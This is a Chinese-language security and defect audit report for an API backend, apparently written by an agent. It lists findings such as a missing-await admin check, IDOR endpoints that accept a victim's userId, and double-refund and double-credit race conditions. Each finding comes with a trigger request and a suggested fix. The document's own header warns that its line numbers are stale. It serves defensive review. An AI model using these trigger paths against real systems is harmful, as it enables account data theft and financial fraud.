<!--
  © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
  Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
  [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
-->

> 【过期快照警告 · 执行前必读】本报告基线 `895027a9d6` 远早于当前 `origin/main`（`e2b004b74940af915320eefa22c8c12093009e7e`）。
> 文中行号与「当场可修」结论大概率已失效，曾被误当作当前真相并误导后续 agent（已因此浪费一轮验证）。
> 凡 `PROJECT_PLAN.md` 引用本报告的任一条目，动手前**必须先对照当前代码复核**（强制纪律见 `RECONCILE-findings-staleness.md` 第四节）。
> 已确认在当前代码修复的条目，见文内 `【已修复@当前代码】` 标注。

# apps/api 后端深度缺陷普查（只读）

- 分析基线：`origin/main` @ `895027a9d644ce0688bb0d533281cf097db69578`（已 `git fetch origin`）
- 方法：先盘点 `apps/api/src` 路由/插件/DB 模块，再按「鉴权与越权 / 事务与并发 / 数据正确性 / 输入面 / 失败路径 / 资源」六面逐条追到实现；每条结论均以 `git show origin/main:<path>` 或工作树（除 4 个与基线不同的文件外等价）实读代码取证。
- 纪律：全程未改仓库文件、未提交、未 push、未执行写盘命令；本文件为唯一输出。
- 去重口径：已对 `PROJECT_PLAN.md` 与 `scripts/data/plan-fields.jsonl` 做关键词检索，未发现与下列条目重复；末尾附「已有覆盖」。
- 代码位置行号均对应 `origin/main`。

---

## 一、鉴权与授权

### F-01 `public-socket` 管理员校验漏 `await`，任意登录用户获得全部运维接口

- **严重度**：P0
- **文件与行号**：`apps/api/src/routes/public-socket.ts:158`；`apps/api/src/db/queries.ts:127`；注册处 `apps/api/src/routes/index.ts:1143`
- **触发路径**：任意普通 JWT 用户请求 `GET /api/admin/public-socket/stats`、`GET /api/admin/public-socket/connections`、`POST /api/admin/public-socket/send-message`、`POST /api/admin/public-socket/broadcast`、`PUT /api/admin/public-socket/config`。
- **根因**：`isSystemAdminUser` 是 `async` 函数，返回 `Promise<boolean>`；此处 `if (!isSystemAdminUser(request.userId!))` 未 `await`，Promise 恒为真值，`!Promise` 恒为 `false`，403 分支永不执行。`authenticate` 通过即放行。
- **证据**：
  - `public-socket.ts:158`：`if (!isSystemAdminUser(request.userId!)) {`
  - `queries.ts:127`：`export async function isSystemAdminUser(id: string): Promise<boolean> {`
  - 同仓正确写法对照：`routes/tenant.ts` 全部为 `await isSystemAdminUser(...)`。
- **影响面**：可读取全部在线连接列表/广播配置、向任意在线用户单播伪造消息、全局广播、修改广播配置——面向全站用户的钓鱼与内容投毒入口。
- **建议修法**：改为 `if (!(await isSystemAdminUser(request.userId!)))`，并补普通用户断言 403 的行为测试。
- **是否当场可修**：是（单行 + 测试）。

### F-02 `/api/chat/stream` 采信客户端 `metadata.userId`，跨用户读取私有知识库/仓库 wiki 并错置预算与治理主体

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-chat-stream.ts:407`（schema）、`:896`、`:910`、`:917`、`:1541`、`:1556`、`:1687`；同型 `apps/api/src/routes/chat-resume.ts:208,231`；消费点 `apps/api/src/services/knowledge-chat-context.ts:86`、`apps/api/src/services/repo-wiki-context.ts`
- **触发路径**：登录用户 `POST /api/chat/stream`，body 中 `metadata.userId = "<受害者 UUID>"`，并开启 `knowledgeContext` / 传入 `repoName`。服务端按该 userId 读取受害者知识库/仓库 wiki，拼入 system prompt 并以 `citations` 帧回传；同时 `guardModelAdmission` 与预算查询也使用该 userId。
- **根因**：知识库/仓库 wiki 的属主、模型准入与预算主体取自客户端可整写的 `metadata.userId`，未与 `request.userId` 绑定；`loadKnowledgeContext` 直接 `ownerUuid: userId`，无本人校验。同文件 `:488/:742/:843/:1330` 的注释显示团队已修复「归属列/广播」方向，但预算/准入/上下文读取三处仍是旧口径。
- **证据**：
  - `ai-chat-stream.ts:407`：`userId: z.string().optional(),`
  - `ai-chat-stream.ts:896`：`userId: opts.metadata?.userId ?? request.userId,`
  - `ai-chat-stream.ts:917`：`const knowledge = await loadKnowledgeContext(mergedMetadata.userId ?? null, queryText)`
  - `ai-chat-stream.ts:1541`：`guardModelAdmission(metadata?.userId ?? request.userId, resolvedModel)`
  - `knowledge-chat-context.ts:86`：`ownerUuid: userId,`
- **影响面**：跨用户读取私有知识库正文（单次最多若干段）与文档标题；可消耗/绕过他人每日 token 预算；可用他人身份规避本人组织 `model_allowlist` 治理。
- **建议修法**：`metadata.userId` 一律忽略，统一使用 `request.userId`；若确需代调用，必须经内部服务票校验并核对 `sub`。
- **是否当场可修**：是（改 3 处取值 + 2 处 chat-resume）。

### F-03 `/api/chat/stream` 采信客户端 `metadata.conversationId`，可清空/覆写他人会话

- **严重度**：P2（需知道目标会话 UUID）
- **文件与行号**：`apps/api/src/routes/ai-chat-stream.ts:1529`（同型 `:1835`）；`apps/api/src/db/chat-queries.ts:1929-1942`
- **触发路径**：登录用户构造 `contextLimit: 0/1` 强制触发上下文压缩，并设 `metadata.conversationId = "<受害者会话 UUID>"`；压缩分支调用 `replaceMessages`，先 `DELETE FROM chat_messages WHERE conversation_id = ?` 再批量插入攻击者构造的消息。
- **根因**：`replaceMessages(conversationId, messages)` 只按会话 ID 删除/插入，无 `userId` 归属谓词；调用方直接使用客户端字段，未校验会话属主（同文件 `bindConversationWorkspace` 有属主校验，此处没有）。
- **证据**：
  - `ai-chat-stream.ts:1529`：`void replaceMessages(metadata.conversationId, result.messages)`
  - `chat-queries.ts:1942`：`await tx.delete(chatMessages).where(eq(chatMessages.conversationId, conversationId))`
  - `ai-chat-stream.ts:348`：`contextLimit: z.number().int().min(0).max(2_000_000).optional(),`
- **影响面**：跨用户会话内容被清空/伪造写入，破坏性越权写。
- **建议修法**：`replaceMessages` 增加 `userId` 参数并先校验会话属主；调用点改用 `request.userId`。
- **是否当场可修**：是。

### F-04 `legacy-ask` 四个成员接口按 `query.userId` 读取任意用户问答内容（IDOR）

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/legacy-ask.ts:37-43`、`:45-51`、`:53-62`、`:64-73`
- **触发路径**：任意登录用户请求
  - `GET /api/legacy/ask/member/question-count?userId=<受害者>`
  - `GET /api/legacy/ask/member/answer-count?userId=<受害者>`
  - `GET /api/legacy/ask/member/questions?userId=<受害者>&page=1&pageSize=100`
  - `GET /api/legacy/ask/member/answers?userId=<受害者>&page=1&pageSize=100`
- **根因**：`userId` 完全取自 query，未与 `request.userId` 比对，也无管理员判定；`asks` / `ask_answers` 为普通用户表（无按用户 RLS）。
- **证据**：
  - `legacy-ask.ts:21`：`const userIdQuery = z.object({ userId: z.string() })`
  - `legacy-ask.ts:54`：`const { userId, page, pageSize } = paginatedUserIdQuery.parse(request.query)`
  - `legacy-ask.ts:58`：`.where(eq(asks.userId, userId))`
  - 同批 `legacy-exam.ts` / `legacy-live.ts` 已按 `request.userId` 收敛，本文件遗漏。
- **影响面**：可枚举任意用户的提问/回答正文与数量（隐私数据泄露）。
- **建议修法**：`userId !== request.userId` 时走 `requireAdmin`（仿 `finance-extended.ts:307`）。
- **是否当场可修**：是。

### F-05 分销统计三接口按 `beneficiaryId` 越权读取他人佣金与下级关系

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/finance-extended.ts:35`、`:79`、`:121`
- **触发路径**：`GET /api/finance/distribution/team-stats?beneficiaryId=<受害者>`、`.../subordinate-stats?beneficiaryId=<受害者>`、`.../invitation-summary?beneficiaryId=<受害者>`。
- **根因**：`const targetId = beneficiaryId ?? request.userId!`，仅登录校验，无 `beneficiaryId === request.userId` 或管理员判定。同文件 `:307-308` 的 `agent-withdrawal/list` 已实现「参数 userId ≠ 本人 ⇒ requireAdmin」，本处属漏改。
- **证据**：
  - `finance-extended.ts:35`：`const targetId = beneficiaryId ?? request.userId!`
  - `finance-extended.ts:44`：`.where(and(eq(commissionFlows.beneficiaryId, targetId), ...))`
  - `finance-extended.ts:307-308`：`if (userId && userId !== request.userId) { await requireAdmin(request, reply)`
- **影响面**：任意登录用户可读取他人佣金总额、下级用户列表、按日汇总（财务与隐私泄露）。
- **建议修法**：仿 `:307` 加本人/管理员判定。
- **是否当场可修**：是。

### F-06 `/api/agent/creation/my/:type` 采信 body `userId`，可读取他人创作数据

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/agent-creation.ts:35`、`:51`
- **触发路径**：`POST /api/agent/creation/my/agents|workflows|plugins`，body 带 `userId=<受害者>`。
- **根因**：`const userId = rest.userId ?? req.userId`，`userId` 来自客户端 body，未与认证身份绑定。
- **证据**：
  - `agent-creation.ts:35`：`userId: z.string().optional(),`
  - `agent-creation.ts:51`：`const userId = rest.userId ?? req.userId`
- **影响面**：读取他人私有 Agent/工作流/插件配置与提示词。
- **建议修法**：固定使用 `req.userId`，删除 body `userId`。
- **是否当场可修**：是。

### F-07 `/api/workspace/background-agents` 可列出/查看/取消所有用户的后台 Agent

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/workspace-ai.ts:1419,1427,1434,1443`；`apps/api/src/services/workspace-ai-service.ts:2140-2154`
- **触发路径**：任意登录用户 `GET /api/workspace/background-agents`、`GET /api/workspace/background-agents/:agentId`、`POST /api/workspace/background-agents/:agentId/cancel`；创建时可通过 body `userUuid` 伪造归属。
- **根因**：Manager 的 `list()/get()/cancel()` 只按 `agentId` 操作，不接收调用者身份；路由层也未按用户过滤；`userUuid` 取自 body。
- **证据**：
  - `workspace-ai.ts:1419`：`userUuid: parsed.data.userUuid ?? request.userId,`
  - `workspace-ai.ts:1427`：`backgroundAgentManager.list()`
  - `workspace-ai-service.ts:2140`：`list(): BackgroundAgent[] { return Array.from(this.agents.values()) }`
- **影响面**：泄漏他人 Agent 的 prompt、workspacePath、运行事件与结果；可取消他人长任务。
- **建议修法**：`list(userId)/get(agentId,userId)/cancel(agentId,userId)` 全部按调用者过滤；`userUuid` 固定为 `request.userId`。
- **是否当场可修**：是。

### F-08 `/api/agent-control/result` 缺归属绑定，可伪结算他人待处理动作

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/agent-control.ts:436`（写入 pending）、`:456-498`（result）
- **触发路径**：知道他人 `requestId` 的登录用户 `POST /api/agent-control/result`，body 不带 `responded` 字段，即走「存量客户端旧语义」直接 `pending.resolve(...)`。
- **根因**：`_pending` 条目未记录发起用户；`/result` 只校验登录，从不校验 `pending.userId === request.userId`；`responded` 为空时跳过令牌/实例校验。
- **证据**：
  - `agent-control.ts:465`：`const pending = _pending.get(res.requestId)`
  - `agent-control.ts:475`：`if (res.responded) { ... } else { _droppedResults.unattributed++ }`
  - `agent-control.ts:500-502`：`clearTimeout(...); _pending.delete(...); pending.resolve(res)`
- **影响面**：可注入伪造执行结果或使他人的动作被错误结算（结果可信度破坏）。
- **建议修法**：`_pending` 存 `userId`，`/result` 校验归属；长期强制 `responded` 回执。
- **是否当场可修**：是（需评估旧客户端兼容）。

---

## 二、事务与并发

### F-09 支付宝退款并发双退（真实资金双出）

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/payment-gateway.ts:1310`（读状态）、`:1315-1318`（金额校验）、`:1338`（调支付宝）、`:1341`（本地置 refunded）；`apps/api/src/services/order-service.ts:648-652`；`apps/api/src/services/alipay.ts:443`
- **触发路径**：同一 `paid` 订单两个并发退款请求（管理员双击、两个管理员、请求重放/预取）。两请求在 `:1310` 都读到 `paid`，都以各自随机 `out_request_no` 调支付宝，支付宝视为两笔独立退款；本地 `updateOrderStatus` 不带 `fromStatus`，两次都成功。
- **根因**：check-then-act 无锁/无幂等键；支付宝退款请求号每次随机；状态流转未用条件 UPDATE 抢占。
- **证据**：
  - `payment-gateway.ts:1310`：`if (order.status !== 'paid') ...`
  - `alipay.ts:443`：`const outRequestNo = \`r\${Date.now()}\${randomBytes(3).toString('hex')}\``
  - 对照：微信退款使用固定 `refund_${outTradeNo}`（`payment-gateway.ts:925`）。
  - `payment-queries.ts` 的 `updateOrderStatus` 仅在传入 `fromStatus` 时才追加 `eq(orders.status, ...)`。
- **影响面**：真实资金双倍退出，本地仅记一次退款，账实不符。
- **建议修法**：先用条件 UPDATE 抢占（`paid → refunding`）或分布式锁 `refund:{orderNo}`；`out_request_no` 固定为 `refund_${outTradeNo}`。
- **是否当场可修**：是。

### F-10 USDT 入账 `user_margins` 读改写无 `FOR UPDATE`，并发丢更新

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/payment-usdt-service.ts:988-1007`（位于 `:952` 开启的事务内）；入口 `apps/api/src/routes/payment-usdt.ts:227` 与轮询 `payment-usdt-service.ts:1068`
- **触发路径**：同一用户两笔 pending 的 USDT 订单并发确认。`:968-977` 的条件 UPDATE 只锁各自订单行；两个事务都读到 `tokenQuantity=X`，分别写 `X+a`、`X+b`，后提交覆盖前者。
- **根因**：事务内读取 `user_margins` 未 `FOR UPDATE`，写入绝对值而非增量表达式；`:1009-1018` 用覆盖后的 `newBalance` 记流水，`balance_after` 与实际余额分叉。
- **证据**：
  - `:988-992`：`const [margin] = await tx.select().from(userMargins).where(eq(userMargins.userId, updated.userId)).limit(1)`
  - `:994`：`const newBalance = (margin?.tokenQuantity ?? 0) + tokensCredited`
  - `:997-999`：`await tx.update(userMargins).set({ tokenQuantity: newBalance, ... })`
- **影响面**：用户充值少入账（真实资损），流水与余额不一致。
- **建议修法**：改为 `set({ tokenQuantity: sql\`token_quantity + \${tokensCredited}\` }).returning()`，或 `SELECT ... FOR UPDATE`。
- **是否当场可修**：是。

### F-11 教育积分账本锁「上一行」无法串行化追加，首次分享奖励可并发双发

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/point-queries.ts:421-428`、`:490-497`、`:571-578`、`:605-612`
- **触发路径**：同一会员两笔并发积分变动（广告回调、首次分享、admin 增减、退款回退）。两事务都 `ORDER BY createdAt DESC LIMIT 1 FOR UPDATE` 锁同一条「最新旧流水」；T1 只 INSERT 新流水不改旧行，T2 在 READ COMMITTED 下仍返回旧行旧 `balance`，于是两边用同一 `beforeBalance` 计算落库。会员无任何流水时锁空集，两事务都按 0 起算。
- **根因**：追加型账本没有稳定的余额行可锁，锁「上一行」不能串行化「追加下一行」；`edu_point_records` 无唯一约束（`packages/database/drizzle/0043_neat_the_spike.sql:1053-1062`）。
- **证据**：
  - `:421-428`：`... .orderBy(desc(eduPointRecords.createdAt)).limit(1).for('update')`
  - `:556-568`：首次分享奖励事务内查重同样对空集无效。
- **影响面**：积分余额少加/多加、展示余额错误、首次分享重复奖励。
- **建议修法**：引入每会员一行余额表并 `UPDATE ... SET balance = balance + n RETURNING` 后再写流水；或对 `memberId` 用 `pg_advisory_xact_lock`。
- **是否当场可修**：是（需迁移）。

### F-12 已支付订单副作用重放与支付回调并发，积分/Outbox 双发

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/order-service.ts:277-292`（积分）、`:297-318`（Outbox）；并发入口 `apps/api/src/routes/order.ts:1147`（complete-saga）
- **触发路径**：支付回调与管理员 `POST /orders/complete-saga` 并发进入 `completeOrderWithSaga`。只有一方条件更新成功，另一方走 `replayPaidSideEffects`；重放侧「查无流水」与胜利方 `earnPoints` 提交前交错 → 双方都发积分。Outbox 同理可写两条 `order.paid`。
- **根因**：check-then-insert，无事务/无唯一约束；`point_transactions.reference_id` 无唯一索引（`packages/database/src/schema/gamification.ts:46-64`）。
- **证据**：
  - `order-service.ts:277-284`：`select ... where referenceId = order.orderNo and type='earn'` → `if (!earned[0]) await earnPoints(...)`
  - `order-service.ts:297-307`：`select outbox ... if (!existing[0]) writeToOutbox(...)`
- **影响面**：订单积分双倍发放；下游重复消费 `order.paid`。
- **建议修法**：给积分流水加 `(reference_id, type)` 部分唯一索引并 `ON CONFLICT DO NOTHING`；Outbox 同理；或整段置于分布式锁/事务内。
- **是否当场可修**：是（需迁移）。

### F-13 API Key 配额到达上限后永不重置（窗口失效，永久 429）

- **严重度**：P2
- **文件与行号**：`apps/api/src/utils/api-key-quota.ts:158-170`
- **触发路径**：某 Key 本小时用满 `hourlyLimit`（或当天用满 `dailyLimit`）。窗口翻转后，SET 分支本应归零，但 WHERE 仍用旧计数判断，永远 0 行；`resetAt` 也永不推进。
- **根因**：重置条件只写在 SET，未进入 WHERE。`recordUsage`（`:111`）在 apps/api 内无调用点，`checkAndConsume` 是唯一写入路径（`plugins/api-key-auth.ts:1172`）。
- **证据**：
  - `.set({ hourlyUsed: sql\`CASE WHEN resetAt <= now THEN ${cost} ELSE hourly_used + ${cost} END\`, ... })`
  - `.where(sql\`... AND hourly_used + ${cost} <= hourly_limit AND daily_used + ${cost} <= daily_limit\`)`
- **影响面**：用满一次配额即被永久 429；`resetAt` 为过去时间，客户端立即重试放大压力。
- **建议修法**：WHERE 增加重置分支（如 `AND (resetAt <= now OR hourly_used + cost <= hourly_limit)`）；或先无条件 CASE 更新并 `RETURNING` 再判断超限。
- **是否当场可修**：是。

### F-14 `deductTokens` 幂等检查与扣减非原子，并发可双扣

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/token-balance-service.ts:184-228`
- **触发路径**：同一幂等键两次并发调用（`crew.ts:193-198` 与 `:263-268` 都用 `crew:${id}`；`ai-callback-worker.ts:161-166` 用任务幂等键）。两事务都查不到流水 → 都执行原子扣减 → 后到 INSERT 命中唯一冲突 `DO NOTHING`，已扣余额不回滚。
- **根因**：幂等判定与扣减不是同一条原子写；唯一索引只保护 INSERT，不保护 UPDATE。
- **证据**：
  - `:188-196`：事务内 `SELECT 1 FROM token_flows WHERE related_order_no = ... AND op_type = 1`
  - `:201-213`：`UPDATE user_margins SET token_quantity = token_quantity - ? ... RETURNING`
  - `:222-226`：`INSERT ... ON CONFLICT ("related_order_no","op_type") DO NOTHING`
- **影响面**：用户被扣两次 token，只留一条流水。
- **建议修法**：事务开头对用户 `user_margins` 行 `SELECT ... FOR UPDATE`；或先 `INSERT token_flows ... ON CONFLICT DO NOTHING RETURNING id` 占位成功后再扣减。
- **是否当场可修**：是。

### F-15 邀请码占用无 `status` 条件，同一码并发注册双发奖励

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/auth.ts:690-727`；`apps/api/src/db/promotion-queries.ts:181-191`
- **触发路径**：两个注册请求并发使用同一邀请码。两者都读到 `unused`，`markInvitationUsed` 无 `status='unused'` 条件（仅 `where id`），都返回成功；`earnPoints` 以 `invitation.id` 为 referenceId 但无唯一约束，邀请人奖励发放两次。
- **根因**：邀请码占用未用条件 UPDATE 抢占；奖励发放未与占码同事务、无幂等唯一键。
- **证据**：
  - `auth.ts:694`：`invitation.status === 'unused'`
  - `promotion-queries.ts:189`：`.where(eq(invitationCodes.id, data.id))`
  - `auth.ts:701-707`、`:716-722`：两处 `earnPoints(... invitation.id)`
- **影响面**：邀请奖励（积分/权益）可被同一码并发刷取。
- **建议修法**：`UPDATE invitation_codes SET status='used', invitee_id=? WHERE id=? AND status='unused' RETURNING id`，0 行即放弃奖励；奖励流水加唯一键。
- **是否当场可修**：是。

---

## 三、支付回调与失败路径

### F-16 提现回调验签用 `JSON.stringify(request.body)`，且无 scoped rawBody 解析器

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/payment-extended.ts:89`；对照 `apps/api/src/routes/payment-gateway.ts:330`（scoped `addContentTypeParser` 设置 `rawBody`）
- **触发路径**：微信提现结果回调 `POST /api/payment/withdrawal/notify`。`payment-extended` 插件未注册 `application/json` 的 buffer 解析器，`request.rawBody` 为 `undefined`，代码退化为 `JSON.stringify(request.body)` 作为验签原文。
- **根因**：微信 V3 验签是对「原始报文字节」做 HMAC；`JSON.stringify` 重序列化在转义/浮点/空白上与原文存在差异。同仓 `payment-gateway.ts:645-650` 注释已明确记录该差异会导致真实回调验签失败、订单无法入账，并为该插件加了 rawBody 解析器；`payment-extended` 未同步。
- **证据**：
  - `payment-extended.ts:89`：`const rawBody = JSON.stringify(request.body)`
  - `payment-gateway.ts:330` 附近的 `addContentTypeParser('application/json', { parseAs: 'buffer' })` 仅作用于 payment-gateway 插件作用域。
  - `services/wechat-pay.ts` 的 `verifyCallbackSignature` 需要原始报文。
- **影响面**：生产环境真实提现回调可能稳定 401，微信重试耗尽后提现永不完成，冻结资金沉淀。
- **建议修法**：在 `payment-extended` 插件内注册同样的 buffer 解析器并写 `request.rawBody`，或统一提取公共插件。
- **是否当场可修**：是。

### F-17 提现回调先消费 nonce、失败仍 ACK SUCCESS，事务失败后资金永久冻结

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/payment-extended.ts:121-123`（先消费 nonce）、`:203-206`（catch 返回 SUCCESS）
- **触发路径**：回调进入后在事务内抛错（死锁、连接中断、`frozen_quantity` 不足等）。代码未更新 `withdrawalFlows.status`，却向微信返回 `SUCCESS` 使其停止重试；且 nonce 已被消费，同头重投会被 `:123` 当「重复通知」直接 SUCCESS。
- **根因**：失败路径 ACK 成功 + 去重键在处理前落库且失败不释放。
- **证据**：
  - `:121`：`const withdrawalNonceVerdict = await consumeNotifyNonce('withdrawal', timestamp, nonce)`
  - `:204-206`：`request.log.error(...); return reply.send({ code: 'SUCCESS', message: 'OK' })`
- **影响面**：转账已成功/失败但流水停在 pending，`frozen_quantity` 永不释放，用户资金永久沉淀，需人工对账。
- **建议修法**：catch 返回 `FAIL`/500 让平台重试；失败时释放 nonce，或改为处理成功后再落去重标记。
- **是否当场可修**：是。

---

## 四、数据正确性

### F-18 文件搜索/最近/全局搜索漏软删除谓词，回收站文件泄漏

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/file-queries.ts:57-80`（searchFiles）、`:148-153`（findRecentFiles）；`apps/api/src/db/search-queries.ts:211-234`、`:491-508`（countFiles）
- **触发路径**：`GET /files/search`、`GET /files/recent`、全局搜索 `/search`。
- **根因**：查询条件只含 `uploadedBy/projectId/name/mime/tag`，缺 `isNull(files.deletedAt)`；同表其它读路径（`workspace-queries.ts:149,160,207,245`、`oss.ts:231`、`v1-public.ts:2264`）均带该谓词。
- **证据**：
  - `packages/database/src/schema/files.ts:24-25`：`// 软删除（回收站）：deletedAt 非空表示已移入回收站` / `deletedAt: timestamp('deleted_at', ...)`
  - `file-queries.ts:78`：`.where(and(...conds))`，`conds` 无 `deletedAt`
  - `search-queries.ts` 全文无 `isNull(files.deletedAt)`
- **影响面**：已删除进回收站的文件仍出现在搜索/最近/全局搜索及计数中，与「已删除」语义矛盾，也可能泄露用户以为已删除的内容。
- **建议修法**：三处条件补 `isNull(files.deletedAt)`。
- **是否当场可修**：是。

### F-19 `GET /files/search` 无 LIMIT/分页，客户端可拉全库

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/file-queries.ts:57-79`；`apps/api/src/routes/files.ts:114-119`、`:262-285`
- **触发路径**：`GET /files/search`（不带 `q` 时条件仅为「本人上传 OR 所在项目」）→ 一次返回该用户可访问的全部文件。
- **根因**：`searchQuerySchema` 无 `limit/page/pageSize`；最终查询无 `.limit()`。同文件 `recentQuerySchema` 明确 `.max(100).default(20)`。
- **证据**：
  - `file-queries.ts:75-79`：`return db.select().from(files).where(and(...conds)).orderBy(desc(files.createdAt))`
  - `routes/files.ts:114` 附近 schema 仅 `q/projectId/mimeType/tag`。
- **影响面**：行数与内存随文件库线性增长；`serializeFile` 逐行 URL 映射放大 CPU。
- **建议修法**：增加 `limit`（上限）与游标/分页。
- **是否当场可修**：是。

### F-20 积分任务「今日/本周」区间用 UTC 午夜解释上海日键，整体错位 8 小时

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/points-tasks.ts:163-167`、`:205-219`、`:322`、`:364`
- **触发路径**：上海时间 00:00–07:59 发生关注/交卷 → 不落入 `[from,to)`，任务进度显示 0；次日 00:00–07:59 的动作被计入前一天。
- **根因**：`dayBounds` 用 `new Date(today + 'T00:00:00Z')`（UTC 午夜），而 `today` 来自 `todayString()` → `bizDayKey()`（上海日键，`utils/biz-day.ts` 的 `bizDayStartUtc` 是 `Date.UTC(y,m,d) - 8h`）。
- **证据**：
  - `points-tasks.ts:165-166`：`from: new Date(today + 'T00:00:00Z')` / `to: ...`
  - `utils/checkin-helpers.ts:25-27`：`todayString()` → `bizDayKey()`
- **影响面**：用户可见的「今日任务完成度」与实际行为不一致，跨日边界错账。
- **建议修法**：改用 `bizDayStartUtc()` / `bizDayRange` 统一出口。
- **是否当场可修**：是。

### F-21 学费入账与排名快照用 UTC 日键写上海业务日列

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/order-service.ts:221`、`:233`；`apps/api/src/routes/edu-ai-management.ts:3447`
- **触发路径**：微信支付回调落在上海 00:00–07:59 → `paymentDate` 记成前一天（月初 1 日会落到上月）；排名快照 `snapshotDate` 与其它按上海日生成的报表对不上。
- **根因**：`new Date().toISOString().slice(0,10)` 取 UTC 日，而 `edu-ledger.ts:347-350` 的 `todayIso()` 用 `bizDayKey()`（上海），两者共用同一 `date` 列。
- **证据**：
  - `order-service.ts:221`：`const today = new Date().toISOString().slice(0, 10)`
  - `edu-ai-management.ts:3447`：`snapshotDate: new Date().toISOString().split('T')[0]!,`
  - `edu-ledger.ts:347-350` 注释明确「用北京日界，与催费定时任务的当日幂等口径一致」。
- **影响面**：账期归属差一天，月初跨月；报表/催费口径分叉。
- **建议修法**：统一调用 `bizDayKey()`。
- **是否当场可修**：是。

### F-22 营收 `sum(amount)::int` 溢出，异常被吞成「全 0 看板」

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin/stats.ts:436`（dashboard）、`:505,509,513,549`（revenue）；catch 在 `:482-492`、`:574-583`
- **触发路径**：`GET /admin/stats/dashboard`、`/admin/stats/revenue`，累计已支付金额（分）超过 2,147,483,647（≈ ¥21,474,836.47）即触发。
- **根因**：`orders.amount` 为 `integer`（分），`sum(int4)` 返回 `int8`，再 `::int` 转 int4 溢出抛 `22003`；外层 `try/catch` 整体兜底并返回 0。
- **证据**：
  - `stats.ts:436`：`total: sql<number>\`coalesce(sum(amount), 0)::int\``
  - `:549`：`coalesce(sum(${orders.amount}), 0)::int`
  - catch 分支 `return reply.send(success({ overview: { totalRevenue: 0, ... } }))`
- **影响面**：营收看板在全站累计过阈值后永久显示 0，且不报错（「账面全绿」）。
- **建议修法**：去掉 `::int`，使用 `::bigint`/`::numeric` 并在应用层转 `Number`；catch 不应把查询失败伪装成 0。
- **是否当场可修**：是。

### F-23 支付宝整单退款金额用浮点 `*100` 比较，部分金额合法整单退款被拒

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/payment-gateway.ts:1315-1318`、`:1325`
- **触发路径**：管理员 `POST /payments/alipay/refund`，`refundAmount=19.9`（或 0.29、4.35 等两位小数），订单金额 1990 分。`19.9 * 100 = 1989.9999999999998`，与 `order.amount=1990` 不等 → 返回 400「仅支持整单退款」。
- **根因**：金额比较直接用 `amountYuan * 100` 的浮点结果；同文件其它路径用 `Math.round(amountYuan * 100)`，此处漏了取整。
- **证据**：
  - `:1315`：`if (amountYuan * 100 < order.amount)`
  - `:1317`：`if (amountYuan * 100 > order.amount)`
  - 本地实测：`node -e "console.log(19.9*100)"` → `1989.9999999999998`
- **影响面**：合法整单退款被拒，客服/管理员无法自助退款，只能改库或人工处理。
- **建议修法**：统一 `Math.round(amountYuan * 100)` 后再比较。
- **是否当场可修**：是。

### F-24 导出/用量按 UTC 边界过滤日期区间，且结束边界丢毫秒

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/admin/export-csv.ts:287-288`、`:373-374`；`apps/api/src/routes/developer-relay.ts:326`；`apps/api/src/routes/developer-relay-usage-analytics.ts:66-71`
- **触发路径**：以单日 `startDate=endDate=2026-11-08` 导出订单/调用明细。
- **根因**：`startDate/endDate` 为前端本地日，`createdAt` 为 `timestamptz`，业务日唯一出口是 Asia/Shanghai；用 `Z` 边界后上海当日 00:00–07:59 被排除，次日 00:00–07:59 被包含。`23:59:59Z` 还丢掉该秒 001–999ms；analytics 用 `.999Z`，同语义两套实现。
- **证据**：
  - `export-csv.ts:287-288`：`new Date(\`${startDate}T00:00:00Z\`)` / `new Date(\`${endDate}T23:59:59Z\`)`
  - `developer-relay.ts:326` 同型；`developer-relay-usage-analytics.ts:71` 用 `23:59:59.999Z`
- **影响面**：导出/用量报表与页面口径差 8 小时，跨日数据错配；两处实现互相不一致。
